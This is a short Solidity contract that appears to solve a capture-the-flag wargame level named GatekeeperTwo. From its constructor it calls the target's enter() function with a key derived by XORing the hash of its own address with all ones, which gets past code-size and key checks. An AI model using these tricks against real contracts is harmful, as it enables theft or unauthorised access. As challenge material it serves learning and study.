// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "./GateKeeper.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperTwoHack {
    constructor()public{
        IGatekeeperTwo level12 = IGatekeeperTwo(0x796E8078318Efe301368f56eC3F1e855F92E5F33);
        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        level12.enter(myKey);
    }
}